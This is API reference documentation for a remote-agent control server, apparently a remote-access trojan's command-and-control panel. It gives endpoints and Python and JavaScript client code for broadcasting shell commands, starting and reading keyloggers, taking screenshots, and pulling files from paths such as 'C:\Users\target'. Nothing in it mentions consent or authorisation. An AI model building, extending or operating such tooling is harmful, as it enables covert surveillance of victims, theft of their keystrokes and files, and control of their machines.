# REST API Reference

Complete documentation for the Remote System Enhancement REST API.

## Base URL

```
http://localhost:8080/api
```

## Authentication

All API endpoints (except `/auth/login`) require authentication using JWT tokens.

### Login

**Endpoint**: `POST /api/auth/login`

**Request Body**:
```json
{
  "username": "admin",
  "password": "admin"
}
```

**Response** (200 OK):
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "expires_at": "2026-04-01T12:00:00Z"
}
```

**Error Response** (401 Unauthorized):
```json
{
  "error": "Invalid credentials"
}
```

### Using Authentication Token

Include the token in the `Authorization` header:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Refresh Token

**Endpoint**: `POST /api/auth/refresh`

**Headers**: `Authorization: Bearer <token>`

**Response** (200 OK):
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "expires_at": "2026-04-01T12:00:00Z"
}
```

## Agent Management

### List All Agents

**Endpoint**: `GET /api/agents`

**Headers**: `Authorization: Bearer <token>`

**Query Parameters**:
- `status` (optional): Filter by status (`online`, `offline`, `idle`)
- `os_type` (optional): Filter by OS type (`Windows`, `Linux`, `Darwin`)
- `limit` (optional): Maximum number of results (default: 100)
- `offset` (optional): Pagination offset (default: 0)

**Response** (200 OK):
```json
{
  "agents": [
    {
      "agent_id": "550e8400-e29b-41d4-a716-446655440000",
      "hostname": "DESKTOP-ABC123",
      "username": "john.doe",
      "os_type": "Windows",
      "os_version": "10.0.19044",
      "ip_address": "192.168.1.100",
      "mac_address": "00:11:22:33:44:55",
      "connected_at": "2026-03-31T10:00:00Z",
      "last_seen": "2026-03-31T12:30:00Z",
      "status": "online",
      "capabilities": ["file_transfer", "screenshot", "keylogger", "executor"]
    }
  ],
  "total": 1,
  "limit": 100,
  "offset": 0
}
```

### Get Agent Details

**Endpoint**: `GET /api/agents/{agent_id}`

**Headers**: `Authorization: Bearer <token>`

**Response** (200 OK):
```json
{
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "hostname": "DESKTOP-ABC123",
  "username": "john.doe",
  "os_type": "Windows",
  "os_version": "10.0.19044",
  "ip_address": "192.168.1.100",
  "mac_address": "00:11:22:33:44:55",
  "connected_at": "2026-03-31T10:00:00Z",
  "last_seen": "2026-03-31T12:30:00Z",
  "status": "online",
  "capabilities": ["file_transfer", "screenshot", "keylogger", "executor"],
  "metadata": {
    "cpu_architecture": "x86_64",
    "memory_total": 16777216000
  }
}
```

**Error Response** (404 Not Found):
```json
{
  "error": "Agent not found"
}
```

## Command Execution

### Send Command to Agent

**Endpoint**: `POST /api/agents/{agent_id}/command`

**Headers**: `Authorization: Bearer <token>`

**Request Body**:
```json
{
  "plugin": "screenshot",
  "action": "capture_screenshot",
  "args": {
    "quality": 85,
    "format": "PNG"
  },
  "timeout": 300
}
```

**Response** (200 OK):
```json
{
  "command_id": "cmd-123456",
  "status": "success",
  "result": {
    "success": true,
    "data": "<base64-encoded-image>",
    "metadata": {
      "execution_time": 1.23
    }
  }
}
```

**Error Response** (408 Request Timeout):
```json
{
  "command_id": "cmd-123456",
  "status": "timeout",
  "error": "Command execution timeout"
}
```

### Broadcast Command

**Endpoint**: `POST /api/agents/broadcast`

**Headers**: `Authorization: Bearer <token>`

**Request Body**:
```json
{
  "agent_ids": [
    "550e8400-e29b-41d4-a716-446655440000",
    "660e8400-e29b-41d4-a716-446655440001"
  ],
  "command": {
    "plugin": "executor",
    "action": "execute_command",
    "args": {
      "command": "ipconfig /all"
    }
  }
}
```

**Response** (200 OK):
```json
{
  "results": {
    "550e8400-e29b-41d4-a716-446655440000": {
      "status": "success",
      "result": {
        "success": true,
        "data": {
          "stdout": "...",
          "stderr": "",
          "exit_code": 0
        }
      }
    },
    "660e8400-e29b-41d4-a716-446655440001": {
      "status": "error",
      "error": "Agent offline"
    }
  }
}
```

## Command History

### Get Agent Command History

**Endpoint**: `GET /api/agents/{agent_id}/history`

**Headers**: `Authorization: Bearer <token>`

**Query Parameters**:
- `limit` (optional): Maximum number of results (default: 50)
- `offset` (optional): Pagination offset (default: 0)
- `status` (optional): Filter by status (`success`, `error`, `timeout`)
- `start_date` (optional): Filter by start date (ISO 8601)
- `end_date` (optional): Filter by end date (ISO 8601)

**Response** (200 OK):
```json
{
  "history": [
    {
      "log_id": "log-123456",
      "agent_id": "550e8400-e29b-41d4-a716-446655440000",
      "command": {
        "plugin": "screenshot",
        "action": "capture_screenshot"
      },
      "result": "Success",
      "status": "success",
      "executed_at": "2026-03-31T12:00:00Z",
      "execution_time": 1.23
    }
  ],
  "total": 1,
  "limit": 50,
  "offset": 0
}
```

### Get All Command History

**Endpoint**: `GET /api/history`

**Headers**: `Authorization: Bearer <token>`

**Query Parameters**: Same as agent-specific history

**Response**: Same format as agent-specific history

## File Operations

### Upload File to Agent

**Endpoint**: `POST /api/agents/{agent_id}/files/upload`

**Headers**: 
- `Authorization: Bearer <token>`
- `Content-Type: multipart/form-data`

**Form Data**:
- `file`: File to upload
- `remote_path`: Destination path on agent

**Response** (200 OK):
```json
{
  "success": true,
  "bytes_transferred": 1048576,
  "checksum": "sha256:abc123...",
  "transfer_time": 2.45
}
```

### Download File from Agent

**Endpoint**: `POST /api/agents/{agent_id}/files/download`

**Headers**: `Authorization: Bearer <token>`

**Request Body**:
```json
{
  "remote_path": "C:\\Users\\target\\document.pdf"
}
```

**Response** (200 OK):
- Content-Type: `application/octet-stream`
- Content-Disposition: `attachment; filename="document.pdf"`
- Body: File binary data

### List Directory

**Endpoint**: `GET /api/agents/{agent_id}/files/list`

**Headers**: `Authorization: Bearer <token>`

**Query Parameters**:
- `path`: Directory path to list

**Response** (200 OK):
```json
{
  "path": "C:\\Users\\target\\Documents",
  "files": [
    {
      "name": "document.pdf",
      "size": 1048576,
      "is_directory": false,
      "modified_at": "2026-03-31T10:00:00Z"
    },
    {
      "name": "Photos",
      "size": 0,
      "is_directory": true,
      "modified_at": "2026-03-30T15:00:00Z"
    }
  ]
}
```

## Screenshot Operations

### Capture Screenshot

**Endpoint**: `GET /api/agents/{agent_id}/screenshot`

**Headers**: `Authorization: Bearer <token>`

**Query Parameters**:
- `quality` (optional): Image quality 1-100 (default: 85)
- `format` (optional): Image format (`PNG`, `JPEG`, `BMP`) (default: PNG)

**Response** (200 OK):
- Content-Type: `image/png` (or appropriate format)
- Body: Image binary data

### Capture Screen Region

**Endpoint**: `POST /api/agents/{agent_id}/screenshot/region`

**Headers**: `Authorization: Bearer <token>`

**Request Body**:
```json
{
  "x": 0,
  "y": 0,
  "width": 1920,
  "height": 1080,
  "quality": 90,
  "format": "JPEG"
}
```

**Response** (200 OK):
- Content-Type: `image/jpeg`
- Body: Image binary data

### Get Screen Information

**Endpoint**: `GET /api/agents/{agent_id}/screen/info`

**Headers**: `Authorization: Bearer <token>`

**Response** (200 OK):
```json
{
  "monitor_count": 2,
  "primary_monitor": {
    "width": 1920,
    "height": 1080,
    "x": 0,
    "y": 0
  },
  "monitors": [
    {
      "id": 0,
      "width": 1920,
      "height": 1080,
      "x": 0,
      "y": 0,
      "is_primary": true
    },
    {
      "id": 1,
      "width": 1920,
      "height": 1080,
      "x": 1920,
      "y": 0,
      "is_primary": false
    }
  ]
}
```

## Keylogger Operations

### Start Keylogger

**Endpoint**: `POST /api/agents/{agent_id}/keylogger/start`

**Headers**: `Authorization: Bearer <token>`

**Request Body**:
```json
{
  "buffer_size": 1000
}
```

**Response** (200 OK):
```json
{
  "success": true,
  "message": "Keylogger started"
}
```

### Stop Keylogger

**Endpoint**: `POST /api/agents/{agent_id}/keylogger/stop`

**Headers**: `Authorization: Bearer <token>`

**Response** (200 OK):
```json
{
  "success": true,
  "message": "Keylogger stopped"
}
```

### Get Keylogger Logs

**Endpoint**: `GET /api/agents/{agent_id}/keylogger/logs`

**Headers**: `Authorization: Bearer <token>`

**Query Parameters**:
- `clear_buffer` (optional): Clear buffer after retrieval (default: true)

**Response** (200 OK):
```json
{
  "logs": [
    {
      "timestamp": "2026-03-31T12:00:00.123Z",
      "key": "H",
      "window": "Notepad - document.txt"
    },
    {
      "timestamp": "2026-03-31T12:00:00.234Z",
      "key": "e",
      "window": "Notepad - document.txt"
    }
  ],
  "count": 2
}
```

### Check Keylogger Status

**Endpoint**: `GET /api/agents/{agent_id}/keylogger/status`

**Headers**: `Authorization: Bearer <token>`

**Response** (200 OK):
```json
{
  "running": true,
  "buffer_size": 1000,
  "current_count": 42
}
```

## Monitoring and Metrics

### Get Server Metrics

**Endpoint**: `GET /api/metrics`

**Headers**: `Authorization: Bearer <token>`

**Response** (200 OK):
```json
{
  "active_agents": 10,
  "total_agents": 15,
  "commands_per_second": 5.2,
  "average_command_time": 0.45,
  "database_queries_per_second": 12.3,
  "memory_usage_mb": 256,
  "uptime_seconds": 86400
}
```

### Get Prometheus Metrics

**Endpoint**: `GET /api/metrics/prometheus`

**Headers**: `Authorization: Bearer <token>`

**Response** (200 OK):
```
# HELP active_agents Number of currently active agents
# TYPE active_agents gauge
active_agents 10

# HELP commands_per_second Commands executed per second
# TYPE commands_per_second gauge
commands_per_second 5.2

# HELP average_command_time Average command execution time in seconds
# TYPE average_command_time gauge
average_command_time 0.45
```

## WebSocket API

### Real-Time Agent Updates

**Endpoint**: `ws://localhost:8080/api/ws/agents`

**Authentication**: Send token as first message

**Client Message**:
```json
{
  "type": "auth",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Server Messages**:

Agent Connected:
```json
{
  "type": "agent_connected",
  "agent": {
    "agent_id": "550e8400-e29b-41d4-a716-446655440000",
    "hostname": "DESKTOP-ABC123",
    "status": "online"
  }
}
```

Agent Disconnected:
```json
{
  "type": "agent_disconnected",
  "agent_id": "550e8400-e29b-41d4-a716-446655440000"
}
```

Command Result:
```json
{
  "type": "command_result",
  "command_id": "cmd-123456",
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "status": "success",
  "result": { ... }
}
```

## Error Responses

### Standard Error Format

All error responses follow this format:

```json
{
  "error": "Error message",
  "code": "ERROR_CODE",
  "details": {
    "field": "Additional context"
  }
}
```

### HTTP Status Codes

- `200 OK`: Request successful
- `201 Created`: Resource created
- `400 Bad Request`: Invalid request parameters
- `401 Unauthorized`: Authentication required or failed
- `403 Forbidden`: Insufficient permissions
- `404 Not Found`: Resource not found
- `408 Request Timeout`: Operation timeout
- `429 Too Many Requests`: Rate limit exceeded
- `500 Internal Server Error`: Server error
- `503 Service Unavailable`: Service temporarily unavailable

### Common Error Codes

- `INVALID_TOKEN`: JWT token invalid or expired
- `AGENT_NOT_FOUND`: Specified agent does not exist
- `AGENT_OFFLINE`: Agent is not currently connected
- `COMMAND_TIMEOUT`: Command execution exceeded timeout
- `PLUGIN_NOT_FOUND`: Requested plugin not available
- `INVALID_PARAMETERS`: Request parameters validation failed
- `RATE_LIMIT_EXCEEDED`: Too many requests

## Rate Limiting

API endpoints are rate-limited to prevent abuse:

- Authentication: 10 requests per minute
- Command execution: 100 requests per minute per agent
- File operations: 10 concurrent transfers per agent
- Screenshot: 1 request per 5 seconds per agent

Rate limit headers:
```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1711891200
```

## Pagination

List endpoints support pagination:

**Request**:
```
GET /api/agents?limit=50&offset=100
```

**Response Headers**:
```
X-Total-Count: 250
X-Limit: 50
X-Offset: 100
Link: </api/agents?limit=50&offset=150>; rel="next"
```

## API Versioning

Current API version: `v1`

Version is included in the URL:
```
http://localhost:8080/api/v1/agents
```

## SDK Examples

### Python

```python
import requests

class RemoteSystemAPI:
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.token = self._login(username, password)
    
    def _login(self, username, password):
        response = requests.post(
            f"{self.base_url}/api/auth/login",
            json={"username": username, "password": password}
        )
        return response.json()["token"]
    
    def _headers(self):
        return {"Authorization": f"Bearer {self.token}"}
    
    def get_agents(self):
        response = requests.get(
            f"{self.base_url}/api/agents",
            headers=self._headers()
        )
        return response.json()["agents"]
    
    def send_command(self, agent_id, plugin, action, args):
        response = requests.post(
            f"{self.base_url}/api/agents/{agent_id}/command",
            headers=self._headers(),
            json={"plugin": plugin, "action": action, "args": args}
        )
        return response.json()

# Usage
api = RemoteSystemAPI("http://localhost:8080", "admin", "admin")
agents = api.get_agents()
result = api.send_command(agents[0]["agent_id"], "screenshot", "capture_screenshot", {"quality": 85})
```

### JavaScript

```javascript
class RemoteSystemAPI {
  constructor(baseUrl, username, password) {
    this.baseUrl = baseUrl;
    this.login(username, password);
  }
  
  async login(username, password) {
    const response = await fetch(`${this.baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({username, password})
    });
    const data = await response.json();
    this.token = data.token;
  }
  
  async getAgents() {
    const response = await fetch(`${this.baseUrl}/api/agents`, {
      headers: {'Authorization': `Bearer ${this.token}`}
    });
    const data = await response.json();
    return data.agents;
  }
  
  async sendCommand(agentId, plugin, action, args) {
    const response = await fetch(
      `${this.baseUrl}/api/agents/${agentId}/command`,
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({plugin, action, args})
      }
    );
    return await response.json();
  }
}

// Usage
const api = new RemoteSystemAPI('http://localhost:8080', 'admin', 'admin');
const agents = await api.getAgents();
const result = await api.sendCommand(agents[0].agent_id, 'screenshot', 'capture_screenshot', {quality: 85});
```

## Support

For API issues or questions:
- Check error messages and status codes
- Review this documentation
- Consult server logs for detailed error information
- Open an issue on the project repository
